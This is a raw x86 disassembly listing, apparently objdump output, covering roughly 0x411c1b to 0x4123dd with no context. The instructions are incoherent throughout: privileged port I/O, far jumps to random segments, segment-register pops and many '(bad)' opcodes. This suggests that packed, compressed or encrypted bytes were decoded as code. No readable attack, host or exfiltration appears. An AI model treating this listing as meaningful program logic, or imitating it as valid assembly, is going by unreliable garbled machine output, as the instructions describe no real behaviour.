  411c1b:	mov    bh,0x23
  411c1d:	mov    ch,BYTE PTR [edx+0x2e]
  411c20:	xchg   edi,eax
  411c21:	mov    ah,0x22
  411c23:	loop   0x411bab
  411c25:	lea    ebp,ds:[ebx]
  411c28:	pop    es
  411c29:	jbe    0x411bd3
  411c2b:	clc    
  411c2c:	push   ebx
  411c2d:	inc    eax
  411c2e:	idiv   BYTE PTR [edx]
  411c30:	lahf   
  411c31:	scas   al,BYTE PTR es:[edi]
  411c32:	adc    DWORD PTR [edx],0x762c7cae
  411c38:	add    edx,edx
  411c3a:	push   ds
  411c3b:	les    ebx,FWORD PTR [eax+0x6f]
  411c3e:	jbe    0x411c1a
  411c40:	dec    edi
  411c41:	jmp    0xe799720f
  411c46:	bound  edx,QWORD PTR [ebp+0x51850bb5]
  411c4c:	sub    BYTE PTR [eax-0x7e634893],bl
  411c52:	mov    esp,0x5f9a2277
  411c57:	out    dx,eax
  411c58:	jnp    0x411cb0
  411c5a:	push   ds
  411c5b:	adc    DWORD PTR ss:[eax],ecx
  411c5e:	pop    ds
  411c5f:	add    ebx,esp
  411c61:	sbb    ecx,DWORD PTR [ecx-0x6775dfc1]
  411c67:	xor    DWORD PTR [edx],eax
  411c69:	int    0x38
  411c6b:	js     0x411c8d
  411c6d:	sub    BYTE PTR [edx-0x7a],cl
  411c70:	push   edx
  411c71:	in     eax,dx
  411c72:	int    0xb
  411c74:	jnp    0x411cd9
  411c76:	cmp    DWORD PTR [edx],ecx
  411c78:	inc    edi
  411c79:	repz push edi
  411c7b:	ror    BYTE PTR [eax+ecx*1],1
  411c7e:	mov    edi,0xc56f5533
  411c83:	stc    
  411c84:	sub    ebx,DWORD PTR [esi-0x56]
  411c87:	push   edi
  411c88:	mov    esi,edx
  411c8a:	fsubr  DWORD PTR [edi-0x3877459c]
  411c91:	mov    esi,0x5c008a2c
  411c96:	into   
  411c97:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c99:	lahf   
  411c9a:	nop
  411c9b:	mov    al,0x31
  411c9d:	cmp    ah,BYTE PTR [esi-0x43b00f1b]
  411ca3:	sbb    eax,0x85c73c00
  411ca8:	pop    ebx
  411ca9:	xchg   edi,eax
  411caa:	sub    al,0xca
  411cac:	enter  0xb7ab,0x34
  411cb0:	sub    BYTE PTR [eax+0x70832140],dh
  411cb6:	or     DWORD PTR ss:[esi+0x1e],ecx
  411cba:	aaa    
  411cbb:	clc    
  411cbc:	xchg   ecx,eax
  411cbd:	scas   eax,DWORD PTR es:[edi]
  411cbe:	inc    ecx
  411cbf:	das    
  411cc0:	jl     0x411c83
  411cc2:	or     BYTE PTR [ecx-0x15],0xaf
  411cc6:	dec    ebx
  411cc7:	pusha  
  411cc8:	mov    gs,WORD PTR [ebx+esi*2]
  411ccb:	xor    al,0xf5
  411ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cce:	mov    edi,0xf8e39653
  411cd3:	icebp  
  411cd4:	retf   0xaf2a
  411cd7:	xchg   edx,eax
  411cd8:	inc    BYTE PTR ds:[ebp+0x22]
  411cdc:	stos   BYTE PTR es:[edi],al
  411cdd:	fwait
  411cde:	jp     0x411c92
  411ce0:	xchg   esp,eax
  411ce1:	iret   
  411ce2:	pop    edi
  411ce3:	out    dx,eax
  411ce4:	inc    esp
  411ce5:	jo     0x411d0a
  411ce7:	xchg   ebx,eax
  411ce8:	cwde   
  411ce9:	dec    eax
  411cea:	sti    
  411ceb:	jmp    0x411cd4
  411ced:	and    ch,BYTE PTR [esi-0x783f0f6a]
  411cf3:	(bad)  
  411cf4:	xchg   esi,eax
  411cf5:	cmc    
  411cf6:	xchg   DWORD PTR [ebx-0x4954a77],ebx
  411cfc:	xchg   edi,eax
  411cfd:	pop    ss
  411cfe:	out    0x36,eax
  411d00:	ret    0x63f7
  411d03:	call   0x2122:0xba5ec34f
  411d0a:	leave  
  411d0b:	inc    ebx
  411d0c:	in     eax,0xd3
  411d0e:	ret    0xb784
  411d11:	xchg   edx,eax
  411d12:	(bad)  
  411d13:	xchg   edi,eax
  411d14:	mov    edx,0x45c3f833
  411d19:	arpl   WORD PTR ds:0xa6f6b89d,bp
  411d1f:	jle    0x411d1a
  411d21:	jge    0x411ce2
  411d23:	in     al,0x22
  411d25:	adc    al,0x7
  411d27:	add    al,0xd
  411d29:	iret   
  411d2a:	or     eax,0xfd9b1c7c
  411d2f:	mov    bh,0x1
  411d31:	fstp   TBYTE PTR [ebp-0xa]
  411d34:	push   edx
  411d35:	(bad)  
  411d36:	jns    0x411cc1
  411d38:	fild   QWORD PTR [ecx-0x26c98a5d]
  411d3e:	out    0xf5,eax
  411d40:	imul   esp,DWORD PTR [ebp+0x13a11623],0xffffffdf
  411d47:	out    0xdb,al
  411d49:	js     0x411d5d
  411d4b:	test   BYTE PTR [edi+0x40],dh
  411d4e:	lock repnz nop
  411d51:	cwde   
  411d52:	adc    al,0xed
  411d54:	stos   BYTE PTR es:[edi],al
  411d55:	sbb    dh,dh
  411d57:	pop    ebx
  411d58:	sahf   
  411d59:	js     0x411d58
  411d5b:	pop    esp
  411d5c:	adc    eax,esi
  411d5e:	mov    DWORD PTR [edi+0x4ff4b3c],ebp
  411d64:	daa    
  411d65:	fnstenv [eax-0x44fd90df]
  411d6b:	psubb  mm1,mm3
  411d6e:	mov    al,0x79
  411d70:	nop
  411d71:	hlt    
  411d72:	je     0x411d2b
  411d74:	lods   eax,DWORD PTR ds:[esi]
  411d75:	ins    BYTE PTR es:[edi],dx
  411d76:	cdq    
  411d77:	sub    esp,DWORD PTR [esi]
  411d79:	pop    esi
  411d7a:	add    ah,dh
  411d7c:	sbb    ebp,DWORD PTR [esp+ebp*2]
  411d7f:	add    BYTE PTR [edi],al
  411d81:	jmp    0x4354:0xb52cba47
  411d88:	aad    0xa7
  411d8a:	cld    
  411d8b:	les    ebx,FWORD PTR [esi+edx*2+0xb33e14f]
  411d92:	jns    0x411dee
  411d94:	rol    DWORD PTR [eax-0x6065d1cf],1
  411d9a:	ss frndint 
  411d9d:	xchg   DWORD PTR [ecx+0x61377513],edi
  411da3:	repnz pop ebp
  411da5:	xchg   ebx,eax
  411da6:	call   0xe7680017
  411dab:	test   al,0xc1
  411dad:	xchg   edx,eax
  411dae:	inc    ebp
  411daf:	sar    ah,1
  411db1:	and    al,0x86
  411db3:	fisub  WORD PTR [edi+0x1bd767a4]
  411db9:	out    dx,eax
  411dba:	fadd   QWORD PTR [eax-0x3c]
  411dbd:	ss scas al,BYTE PTR es:[edi]
  411dbf:	mov    esp,0x78d6d8a
  411dc4:	scas   eax,DWORD PTR es:[edi]
  411dc5:	push   0x16d03c73
  411dca:	xchg   esp,eax
  411dcb:	in     al,dx
  411dcc:	mov    ebp,0xad53dcb
  411dd1:	or     DWORD PTR [esi+0x41],edi
  411dd4:	ficom  DWORD PTR [ebp-0x5f]
  411dd7:	iret   
  411dd8:	dec    esi
  411dd9:	mov    BYTE PTR [edi+0x5b],cl
  411ddc:	in     eax,dx
  411ddd:	dec    ebx
  411dde:	loopne 0x411d77
  411de0:	adc    BYTE PTR [ebp+esi*8+0x74c4df64],bh
  411de7:	add    eax,0xcb753ded
  411dec:	sbb    ch,BYTE PTR [edi]
  411dee:	or     eax,0xd6799f5
  411df3:	pop    eax
  411df4:	ffree  st(7)
  411df6:	call   0xc5615082
  411dfb:	pop    esp
  411dfc:	xchg   ebp,eax
  411dfd:	add    al,0x96
  411dff:	mov    bl,0x19
  411e01:	clc    
  411e02:	sbb    al,0x7
  411e04:	loop   0x411d93
  411e06:	shl    BYTE PTR [eax-0x9],1
  411e09:	jo     0x411e52
  411e0b:	jns    0x411d9d
  411e0d:	push   ebp
  411e0e:	or     cl,ah
  411e10:	push   esp
  411e11:	sub    al,BYTE PTR [esi]
  411e13:	push   esp
  411e14:	mov    dl,0xb7
  411e16:	xchg   ebp,eax
  411e17:	neg    DWORD PTR [ebx+0x25]
  411e1a:	push   ss
  411e1b:	or     BYTE PTR [esi-0x2317ac90],0x1f
  411e22:	lea    eax,[ecx+ecx*8+0x6df6cef3]
  411e29:	fs jnp 0x411dce
  411e2c:	and    al,0xd5
  411e2e:	cdq    
  411e2f:	dec    eax
  411e30:	das    
  411e31:	pop    ds
  411e32:	pop    ebp
  411e33:	or     cl,BYTE PTR [ecx]
  411e35:	inc    edx
  411e36:	out    dx,al
  411e37:	and    BYTE PTR [ecx+0x21133c1f],al
  411e3d:	call   0x6689:0x94d510ee
  411e44:	out    0xec,eax
  411e46:	jmp    0xdb7f:0xe231887b
  411e4d:	std    
  411e4e:	mov    WORD PTR [eax+0x29],es
  411e51:	sub    bl,BYTE PTR [esi]
  411e53:	imul   edx,ebp,0x58
  411e56:	dec    edx
  411e57:	adc    BYTE PTR [esi+0x4a8dd63d],dl
  411e5d:	adc    BYTE PTR [eax],dl
  411e5f:	mov    ah,0xc4
  411e61:	or     DWORD PTR cs:[ebx+esi*1+0x1b8b2e94],esp
  411e69:	jg     0x411e27
  411e6b:	adc    edx,DWORD PTR ss:0x373ed09d
  411e72:	add    al,0x97
  411e74:	lds    ecx,FWORD PTR [edx-0x1e]
  411e77:	in     eax,dx
  411e78:	sub    BYTE PTR [esp+esi*4+0x69],dh
  411e7c:	outs   dx,DWORD PTR ds:[esi]
  411e7d:	or     bh,BYTE PTR [edi+0x7e81f91]
  411e83:	in     eax,0xfe
  411e85:	lea    ecx,[ecx+eax*8]
  411e88:	fadd   st(5),st
  411e8a:	mov    ds:0x458796aa,eax
  411e8f:	jb     0x411e32
  411e91:	clc    
  411e92:	shr    BYTE PTR [edx-0x36],cl
  411e95:	pop    edi
  411e96:	test   DWORD PTR [ecx+0x3b769977],ecx
  411e9c:	mov    al,0x4d
  411e9e:	xor    BYTE PTR [eax-0x2cf02a7f],cl
  411ea4:	lahf   
  411ea5:	cs scas eax,DWORD PTR es:[edi]
  411ea7:	xchg   ecx,eax
  411ea8:	jecxz  0x411f10
  411eaa:	out    dx,al
  411eab:	adc    BYTE PTR [edi-0x33],0x15
  411eaf:	ss mov esp,0x327f0a03
  411eb5:	pop    ecx
  411eb6:	xor    BYTE PTR [esp+edi*2-0x1],dh
  411eba:	sbb    eax,0x39e534c6
  411ebf:	xchg   ebx,eax
  411ec0:	stc    
  411ec1:	enter  0xe034,0xa3
  411ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ec6:	outs   dx,BYTE PTR ds:[esi]
  411ec7:	scas   al,BYTE PTR es:[edi]
  411ec8:	push   0x6b
  411eca:	(bad)  
  411ecb:	fidivr WORD PTR [eax]
  411ecd:	icebp  
  411ece:	stos   DWORD PTR es:[edi],eax
  411ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed0:	and    DWORD PTR ds:0x96df9216,ecx
  411ed6:	pop    edi
  411ed7:	in     al,0x3b
  411ed9:	pop    ds
  411eda:	jns    0x411f20
  411edc:	mov    cl,0x6
  411ede:	repz (bad) 
  411ee0:	sar    BYTE PTR [ebp+0x6f],0x44
  411ee4:	scas   eax,DWORD PTR es:[edi]
  411ee5:	mov    BYTE PTR [eax],bh
  411ee7:	mov    bl,BYTE PTR [edi-0x13ea26a3]
  411eed:	into   
  411eee:	hlt    
  411eef:	shl    DWORD PTR [eax-0x29821ac],1
  411ef5:	and    DWORD PTR [esi],ecx
  411ef7:	adc    esp,DWORD PTR [edx+edi*1+0x8298e8]
  411efe:	xor    ah,BYTE PTR [esi+ebp*8-0x6]
  411f02:	retf   0x2e3
  411f05:	inc    ecx
  411f06:	test   al,0xb6
  411f08:	mov    edx,0xc4ef4079
  411f0d:	stos   BYTE PTR es:[edi],al
  411f0e:	pop    ss
  411f0f:	fimul  WORD PTR [edx+ebx*1+0x7c]
  411f13:	dec    esi
  411f14:	ins    BYTE PTR es:[edi],dx
  411f15:	push   cs
  411f16:	dec    BYTE PTR [ebp+ecx*2-0x67]
  411f1a:	shr    BYTE PTR [edi+0x1d6b7c8b],cl
  411f20:	ffreep st(4)
  411f22:	ins    DWORD PTR es:[edi],dx
  411f23:	and    eax,0x3c85f731
  411f28:	or     eax,0x642ed98f
  411f2d:	xlat   BYTE PTR ds:[ebx]
  411f2e:	sbb    al,0x53
  411f30:	xchg   BYTE PTR [edi],dl
  411f32:	int    0x8d
  411f34:	cmp    BYTE PTR [edi+0x8a88c43],al
  411f3a:	push   DWORD PTR es:[ecx+0x589b9eef]
  411f41:	dec    esp
  411f42:	mov    bl,al
  411f44:	in     eax,dx
  411f45:	dec    edi
  411f46:	fidivr DWORD PTR [ebx]
  411f48:	mov    ebp,0x2ee1b8bc
  411f4d:	mov    edx,0xda902e58
  411f52:	sar    bh,0xc7
  411f55:	in     al,0x71
  411f57:	jg     0x411ef4
  411f59:	jp     0x411f36
  411f5b:	cmp    dh,BYTE PTR [eax-0x16590ad7]
  411f61:	push   ebx
  411f62:	jl     0x411fce
  411f64:	fnstenv [ebp-0x6966add9]
  411f6a:	or     eax,0x249e706c
  411f6f:	test   dh,al
  411f71:	jns    0x411f9b
  411f73:	cmp    eax,DWORD PTR [edi-0x35]
  411f76:	sbb    esp,DWORD PTR es:[ecx]
  411f79:	data16 jae 0x411f5c
  411f7c:	push   0xffffffd6
  411f7e:	mov    bl,0xc
  411f80:	in     al,dx
  411f81:	push   eax
  411f82:	jmp    0x46eaccfa
  411f87:	cld    
  411f88:	mov    ebx,0x171a670b
  411f8d:	je     0x411f41
  411f8f:	or     BYTE PTR [eax],0x57
  411f92:	fdivr  st(5),st
  411f94:	int    0xec
  411f96:	pop    esp
  411f97:	idiv   DWORD PTR [edi-0x52a3d]
  411f9d:	or     ecx,edi
  411f9f:	lds    edx,FWORD PTR [edx-0x79]
  411fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fa3:	fdivr  QWORD PTR [edx+0x5b]
  411fa6:	jp     0x412007
  411fa8:	mov    bl,0x4
  411faa:	push   edi
  411fab:	repz in eax,0xcc
  411fae:	out    dx,al
  411faf:	mov    cl,0xc1
  411fb1:	fbstp  TBYTE PTR [eax+0x70516e6]
  411fb7:	iret   
  411fb8:	test   BYTE PTR [eax+ecx*8+0x4fa228da],0x68
  411fc0:	pusha  
  411fc1:	sbb    BYTE PTR ds:0x45531379,bl
  411fc7:	(bad)  
  411fc8:	jecxz  0x411f5e
  411fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fcb:	stos   BYTE PTR es:[edi],al
  411fcc:	cs mov gs,ebp
  411fcf:	out    dx,al
  411fd0:	jbe    0x411fc9
  411fd2:	cmp    bl,ch
  411fd4:	loope  0x411f6a
  411fd6:	and    eax,0x77718faa
  411fdb:	ins    BYTE PTR es:[edi],dx
  411fdc:	jmp    0x411fcc
  411fde:	aaa    
  411fdf:	ins    BYTE PTR es:[edi],dx
  411fe0:	inc    ecx
  411fe1:	std    
  411fe2:	out    dx,eax
  411fe3:	dec    ebx
  411fe4:	addr16 sbb bh,bh
  411fe7:	pop    esi
  411fe8:	xor    DWORD PTR [esi],esi
  411fea:	jg     0x411fe9
  411fec:	aaa    
  411fed:	test   eax,0xc546ebf1
  411ff2:	test   DWORD PTR [esi],ecx
  411ff4:	sbb    DWORD PTR [ebx+0x4a],esi
  411ff7:	and    ah,bl
  411ff9:	push   ds
  411ffa:	lds    eax,FWORD PTR [ecx+edi*8-0x44]
  411ffe:	sub    eax,0x706f8f2b
  412003:	cmp    al,BYTE PTR [eax+0x46e4a842]
  412009:	and    ecx,0x40
  41200c:	adc    ebx,DWORD PTR [ecx*4+0x2c2c62b8]
  412013:	arpl   WORD PTR [edi],ax
  412015:	xor    ebx,ebx
  412017:	imul   ebp,ecx,0x40
  41201a:	sbb    WORD PTR [ecx+0x6cf60e62],si
  412021:	(bad)  
  412022:	adc    DWORD PTR [edx+0x1c221f8d],ebx
  412028:	add    ebp,ebx
  41202a:	adc    eax,0x60caebbd
  41202f:	adc    edi,DWORD PTR [edx-0x784260a0]
  412035:	inc    ebx
  412036:	aam    0xed
  412038:	mov    eax,0xc6dd686b
  41203d:	imul   eax,DWORD PTR [eax],0xbc1a4af4
  412043:	loop   0x411ff0
  412045:	add    DWORD PTR [edi-0x585d4a98],ecx
  41204b:	push   edx
  41204c:	xchg   ebx,eax
  41204d:	jbe    0x412021
  41204f:	xor    eax,0xd39ba1f5
  412054:	(bad)  
  412055:	adc    eax,DWORD PTR [esi]
  412057:	pop    ds
  412058:	sub    BYTE PTR [ecx+0x7d57ac2d],0x62
  41205f:	cmp    al,0xc9
  412061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412062:	mov    ebp,0x8fd9e418
  412067:	jg     0x4120ca
  412069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41206a:	outs   dx,BYTE PTR ds:[esi]
  41206b:	pop    esi
  41206c:	lea    esi,[eax-0x1]
  41206f:	cmp    ah,BYTE PTR ds:0xfc4f864d
  412075:	inc    ebx
  412076:	push   es
  412077:	xchg   edi,eax
  412078:	loopne 0x412037
  41207a:	aam    0xce
  41207c:	ins    BYTE PTR es:[edi],dx
  41207d:	ret    0x3876
  412080:	or     eax,DWORD PTR [edi+0x39]
  412083:	aam    0x1e
  412085:	push   eax
  412086:	pandn  mm3,QWORD PTR [ebx+ebx*8-0x63dc5374]
  41208e:	pusha  
  41208f:	push   edi
  412090:	cmp    bl,BYTE PTR [ecx+edi*1+0x164d3307]
  412097:	int3   
  412098:	inc    eax
  412099:	cdq    
  41209a:	inc    ebp
  41209b:	shr    BYTE PTR [eax+0xc2f3790],0xb0
  4120a2:	mov    ecx,DWORD PTR [ebx]
  4120a4:	mov    ds:0x134ec01b,eax
  4120a9:	jno    0x412059
  4120ab:	loope  0x4120ca
  4120ad:	inc    edx
  4120ae:	ror    DWORD PTR [ecx+edx*4-0x4],0x4e
  4120b3:	mov    esi,DWORD PTR [ecx]
  4120b5:	shl    BYTE PTR [esi+0x18939aee],0x95
  4120bc:	mov    WORD PTR [edx-0x63],?
  4120bf:	(bad)  
  4120c0:	leave  
  4120c1:	add    eax,0x33d4bd5a
  4120c6:	mov    WORD PTR [esi],ss
  4120c8:	fdivr  QWORD PTR [ebx-0x19d25266]
  4120ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120cf:	mov    cl,0x98
  4120d1:	push   esp
  4120d2:	adc    eax,DWORD PTR [ecx+edi*4]
  4120d5:	out    0xe2,al
  4120d7:	and    ebp,edx
  4120d9:	or     eax,0x79e6a792
  4120de:	cdq    
  4120df:	xchg   edi,eax
  4120e0:	in     eax,0xdb
  4120e2:	cmp    ebp,DWORD PTR [eax+0x5b9103a]
  4120e8:	jl     0x4120f8
  4120ea:	push   esp
  4120eb:	jne    0x4120cd
  4120ed:	inc    esp
  4120ee:	mov    dl,0x1
  4120f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f1:	ss mov bh,0x1b
  4120f4:	(bad)  
  4120f5:	or     DWORD PTR [edi+0x230da043],ecx
  4120fb:	jb     0x412125
  4120fd:	es aaa 
  4120ff:	and    al,0x9a
  412101:	sub    BYTE PTR [eax],0x5c
  412104:	loope  0x412150
  412106:	lahf   
  412107:	xchg   esi,eax
  412108:	aam    0x21
  41210a:	mov    bl,0x4
  41210c:	shr    BYTE PTR [ecx],1
  41210e:	and    eax,0x420363a4
  412113:	(bad)  
  412114:	ror    DWORD PTR [edi-0x6],1
  412117:	push   edi
  412118:	pusha  
  412119:	ja     0x4120d3
  41211b:	mov    ch,0x5e
  41211d:	mov    dl,0xe9
  41211f:	mov    ebx,0xc52de4c8
  412124:	jle    0x412126
  412126:	ins    BYTE PTR es:[edi],dx
  412127:	es adc eax,0xf154b61b
  41212d:	cmp    ah,BYTE PTR [edi+0x1e]
  412130:	stos   DWORD PTR es:[edi],eax
  412131:	cmp    al,0x84
  412133:	sbb    DWORD PTR [eax-0x3ef9000f],edx
  412139:	push   cs
  41213a:	or     cl,cl
  41213c:	jae    0x412151
  41213e:	mov    edx,0xe6c47c2
  412143:	int    0xcd
  412145:	xor    ah,BYTE PTR [bx]
  412148:	and    DWORD PTR [esi+0x7a],eax
  41214b:	sub    eax,0xe6df0a28
  412150:	xchg   ecx,eax
  412151:	sbb    bh,BYTE PTR [esi-0x7283ebd]
  412157:	xlat   BYTE PTR ds:[ebx]
  412158:	cmp    DWORD PTR [edx-0x613ec0db],0xee334dff
  412162:	jns    0x4121a6
  412164:	inc    edi
  412165:	ins    DWORD PTR es:[edi],dx
  412166:	pop    ds
  412167:	(bad)  
  412168:	pop    ds
  412169:	retf   
  41216a:	fbld   TBYTE PTR ds:[ecx-0x5ce38b9a]
  412171:	gs loopne 0x412179
  412174:	cmp    DWORD PTR [edx+0x5d5bc97b],0x7d060aee
  41217e:	retf   0x40e7
  412181:	xlat   BYTE PTR ds:[ebx]
  412182:	add    ch,bl
  412184:	inc    ebx
  412185:	jns    0x412125
  412187:	aad    0x34
  412189:	ds imul edx,ebx,0x29
  41218d:	inc    esp
  41218e:	imul   ebx,DWORD PTR [eax],0x19ad5019
  412194:	push   0xc52fdb7d
  412199:	das    
  41219a:	xchg   ecx,eax
  41219b:	push   ecx
  41219c:	loope  0x4121f1
  41219e:	mov    eax,ds:0x840483fc
  4121a3:	inc    eax
  4121a4:	test   eax,0x9dce8475
  4121a9:	pop    esp
  4121aa:	push   eax
  4121ab:	jmp    0xc69c:0xfbef9458
  4121b2:	data16 (bad) 
  4121b5:	lea    esi,[ecx+edx*1+0x3a]
  4121b9:	scas   al,BYTE PTR es:[edi]
  4121ba:	xchg   edx,eax
  4121bb:	fsubr  QWORD PTR [eax-0x7e]
  4121be:	fmul   QWORD PTR [ebp+eax*1-0x1b]
  4121c2:	outs   dx,DWORD PTR ds:[esi]
  4121c3:	inc    esp
  4121c4:	jmp    0x45c2b9ec
  4121c9:	fwait
  4121ca:	jmp    0x2ca0:0x2f4302
  4121d1:	call   DWORD PTR [eax-0x44a94fa0]
  4121d7:	stos   DWORD PTR es:[edi],eax
  4121d8:	data16 cld 
  4121da:	test   al,0xc8
  4121dc:	stos   BYTE PTR es:[edi],al
  4121dd:	iret   
  4121de:	jg     0x4121d7
  4121e0:	fcmove st,st(5)
  4121e2:	adc    al,0xed
  4121e4:	pop    ecx
  4121e5:	icebp  
  4121e6:	sub    ecx,DWORD PTR [ecx-0x3c]
  4121e9:	adc    ah,BYTE PTR [eax]
  4121eb:	mov    edi,0x21f8d0ac
  4121f0:	jne    0x412182
  4121f2:	ins    DWORD PTR es:[edi],dx
  4121f3:	gs adc cl,bh
  4121f6:	cwde   
  4121f7:	pop    eax
  4121f8:	mov    ebx,DWORD PTR [esi]
  4121fa:	push   esi
  4121fb:	cmp    eax,0x4d4a5460
  412200:	dec    edi
  412201:	pop    ecx
  412202:	mov    ch,BYTE PTR [esp+0x6870b1d0]
  412209:	jmp    0x412233
  41220b:	hlt    
  41220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220d:	inc    edx
  41220e:	fsub   QWORD PTR [ecx+0x7b33221c]
  412214:	dec    edx
  412215:	and    DWORD PTR [ebx-0x93e68d7],0xfffffff3
  41221c:	xchg   ebx,eax
  41221d:	mov    ds:0x331f4b6a,al
  412222:	jae    0x41228a
  412224:	das    
  412225:	out    0x51,al
  412227:	not    BYTE PTR [edi+0x7b76863d]
  41222d:	xor    DWORD PTR [ecx+0x1d],esi
  412230:	cmp    ecx,DWORD PTR [eax+0x30]
  412233:	in     eax,0xe4
  412235:	push   0xa2995e27
  41223a:	push   ss
  41223b:	repnz mov ecx,0xdbce785b
  412241:	fwait
  412242:	ret    
  412243:	sbb    DWORD PTR [ebx+0x76],edx
  412246:	lahf   
  412247:	call   0x976c:0xfcb2609b
  41224e:	test   al,0xb5
  412250:	pop    esi
  412251:	dec    eax
  412252:	push   cs
  412253:	jnp    0x4121e1
  412255:	dec    esp
  412256:	mov    ebp,0x37cd7297
  41225b:	mov    bh,0xb
  41225d:	int    0x9a
  41225f:	in     al,dx
  412260:	push   cs
  412261:	mov    edx,0xdbf4d365
  412266:	lahf   
  412267:	jge    0x41224f
  412269:	jno    0x412272
  41226b:	adc    ebp,ebx
  41226d:	adc    DWORD PTR [ecx+0x28],0x2977c9e3
  412274:	lds    eax,FWORD PTR [eax+0x68b8d839]
  41227a:	add    ecx,DWORD PTR [edx]
  41227c:	(bad)  
  41227d:	stos   BYTE PTR es:[edi],al
  41227e:	mov    ebx,0xa57de58b
  412283:	pop    es
  412284:	pop    edi
  412285:	lahf   
  412286:	fst    QWORD PTR [edi+eax*2-0x55]
  41228a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41228b:	sub    BYTE PTR [eax+0x44],bl
  41228e:	add    eax,0x392e6a88
  412293:	cmp    DWORD PTR [eax+0x764169d0],edi
  412299:	shl    DWORD PTR [ebx],1
  41229b:	bound  esi,QWORD PTR [esi+0x48]
  41229e:	mul    BYTE PTR [ebx]
  4122a0:	out    0x4c,eax
  4122a2:	retf   0x830c
  4122a5:	arpl   si,sp
  4122a7:	mov    al,0xa8
  4122a9:	or     DWORD PTR [esi],esp
  4122ab:	or     DWORD PTR [eax-0x6b3dff28],0x7
  4122b2:	stos   DWORD PTR es:[edi],eax
  4122b3:	rol    al,0x75
  4122b6:	dec    edx
  4122b7:	(bad)  
  4122b9:	clc    
  4122ba:	add    al,0xf0
  4122bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bd:	cs jne 0x4122da
  4122c0:	cs jg  0x412290
  4122c3:	aam    0xf7
  4122c5:	and    eax,0x96c8e655
  4122ca:	and    BYTE PTR [ebx],al
  4122cc:	xor    eax,DWORD PTR ss:[edi+esi*4-0x3d939576]
  4122d4:	adc    eax,0xa276ac16
  4122d9:	ds push eax
  4122db:	dec    edi
  4122dc:	dec    edi
  4122dd:	inc    ebp
  4122de:	add    DWORD PTR [eax-0x6b],eax
  4122e1:	mov    eax,ds:0x61233974
  4122e6:	jns    0x4122a1
  4122e8:	(bad)  
  4122e9:	mov    dh,0x8a
  4122eb:	pop    edi
  4122ec:	outs   dx,DWORD PTR ds:[esi]
  4122ed:	push   ds
  4122ee:	mov    dh,0x67
  4122f0:	cmp    dl,bl
  4122f2:	mov    ch,0x86
  4122f4:	ror    ecx,cl
  4122f6:	out    0xab,eax
  4122f8:	and    BYTE PTR [ebx-0x44],bl
  4122fb:	shld   DWORD PTR [esi-0x18a519ed],ecx,cl
  412302:	cmp    BYTE PTR [edi+ebp*8],bl
  412305:	loope  0x4122b9
  412307:	jmp    0x4122f2
  412309:	adc    eax,0xa3c5f432
  41230e:	call   0xeab0f9b8
  412313:	adc    edx,DWORD PTR [ebx+edx*2-0x3aa22262]
  41231a:	arpl   WORD PTR [ebx+0x3a],bx
  41231d:	mov    ebp,0x74d45614
  412322:	cdq    
  412323:	mov    ch,0xaa
  412325:	out    dx,al
  412326:	sbb    BYTE PTR [ecx-0x1f4d91d0],cl
  41232c:	or     esp,DWORD PTR [ecx-0x770bca74]
  412332:	test   BYTE PTR [esi+0x76],dh
  412335:	and    cl,al
  412337:	fsub   st,st(0)
  412339:	sub    cl,ch
  41233b:	leave  
  41233c:	(bad)  
  41233d:	(bad)  
  41233f:	dec    ebp
  412340:	pop    ds
  412341:	imul   ebp,DWORD PTR [edx*8-0x333263b6],0x7a
  412349:	int3   
  41234a:	loop   0x412337
  41234c:	jg     0x4123a0
  41234e:	push   cs
  41234f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412350:	and    al,0x89
  412352:	int    0xb8
  412354:	ds jg  0x412378
  412357:	sub    BYTE PTR [edi-0x70],bh
  41235a:	or     al,0x24
  41235c:	xchg   BYTE PTR [ebx-0x36],bh
  41235f:	mov    eax,0xdcdd0bba
  412364:	and    eax,esp
  412366:	loopne 0x412338
  412368:	enter  0xe609,0x50
  41236c:	mov    al,ds:0x6050b165
  412371:	push   eax
  412372:	ret    
  412373:	cwde   
  412374:	push   ebx
  412375:	jg     0x412343
  412377:	stos   BYTE PTR es:[edi],al
  412378:	stc    
  412379:	sbb    ch,BYTE PTR [ebp-0x42622b03]
  41237f:	push   cs
  412380:	mov    ch,0xe9
  412382:	out    0x3b,al
  412384:	push   cs
  412385:	in     eax,0xfc
  412387:	adc    BYTE PTR [esi+0x4c5e0ecb],0xa
  41238e:	(bad)  
  412390:	pop    eax
  412391:	repnz cmp al,0xf7
  412394:	sbb    BYTE PTR [edx-0x3],dl
  412397:	pop    ebp
  412398:	in     al,0x64
  41239a:	fcom   QWORD PTR [ebp-0x25]
  41239d:	pop    esp
  41239e:	and    al,0x4d
  4123a0:	daa    
  4123a1:	pop    edi
  4123a2:	push   ss
  4123a3:	test   BYTE PTR [eax+0x50292df3],al
  4123a9:	(bad)  
  4123aa:	repz mov dl,0x1b
  4123ad:	call   0x5ed0937c
  4123b2:	mov    ds:0x64dde754,al
  4123b7:	xchg   ebp,eax
  4123b8:	fdivrp st(4),st
  4123ba:	push   ecx
  4123bb:	inc    esi
  4123bc:	sahf   
  4123bd:	dec    eax
  4123be:	mov    WORD PTR [esi+0x1b01f7f8],?
  4123c4:	mov    ah,0x10
  4123c6:	or     al,cl
  4123c8:	or     BYTE PTR [esi],ah
  4123ca:	sub    eax,0xb353c17f
  4123cf:	pop    esi
  4123d0:	dec    edi
  4123d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d2:	in     eax,dx
  4123d3:	imul   DWORD PTR [edi-0x6745baa1]
  4123d9:	push   ss
  4123da:	inc    ecx
  4123db:	pop    ebx
  4123dc:	das    
  4123dd:	fiadd  DWORD PTR [esi-0x61a7ca41]
